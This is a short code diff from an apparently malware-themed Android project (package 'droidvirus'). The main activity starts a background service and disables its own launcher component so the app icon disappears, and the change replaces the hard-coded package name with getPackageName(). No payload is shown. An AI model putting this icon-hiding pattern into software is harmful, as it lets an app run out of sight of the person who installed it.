@@ -15,8 +15,8 @@ public class MainActivity extends Activity {
         startService(new Intent(this, MainService.class));
 
         ComponentName cn = new ComponentName(
-                "com.artisanter.droidvirus",
-                "com.artisanter.droidvirus.MainActivity");
+                getPackageName()
+                , getPackageName() + ".MainActivity");
         getPackageManager()
         .setComponentEnabledSetting(cn,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
